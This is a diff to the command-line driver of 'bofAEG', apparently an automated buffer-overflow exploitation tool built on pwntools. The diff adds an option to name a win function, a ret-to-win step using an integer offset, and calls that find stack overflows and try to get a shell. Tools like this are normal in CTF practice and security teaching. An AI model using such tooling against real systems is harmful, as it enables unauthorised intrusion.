@@ -15,18 +15,16 @@ import IPython
 from utils.my_utils import *
 from utils.classses import *
 
-pwn.context.log_level = 'debug'
-pwn.context.arch = 'amd64'
-
-
-
 if __name__ == '__main__':
     import argparse
+    
+    pwn.context.log_level = 'debug'
     
     parser = argparse.ArgumentParser(description="Binary Exploitation Tool - Buffer Overflow - bofAEG")
 
     parser.add_argument('--base', '-b', help='Base address of binary')
     parser.add_argument('--find-win', '-fw', action='store_true', help='Use find win function')
+    parser.add_argument('--win-name', help="Name of win function", type=str)
     parser.add_argument('--win-address', '-wa', help='Specify the name of win function')
     parser.add_argument('--canary', '-cn', help='Specify stack canary address')
     parser.add_argument('--get-shell', '-gsh', action='store_true', help='Use get shell technique')
@@ -97,7 +95,10 @@ if __name__ == '__main__':
         bof_aeg.int_overflow(args.int, args.int_offset, prefix=args.prefix)
         exit(0)
     
-    bof_aeg.find_win()
+    if args.win_name:
+        bof_aeg.win_addr = elf.sym[args.win_name]
+    else:
+        bof_aeg.find_win()
 
     if elf.pie:
         bof_aeg.explore_to_win()
@@ -107,6 +108,9 @@ if __name__ == '__main__':
     p.info('Starting find stack bof')
     bof_aeg.find_stack_bof()
     p.info('Find stack bof ended')
+    
+    if args.int_offset and not args.integer_overflow:
+        bof_aeg.ret_to_win(offset=args.int_offset)
     
     p.info('Trying to get shell')
     bof_aeg.get_shell()
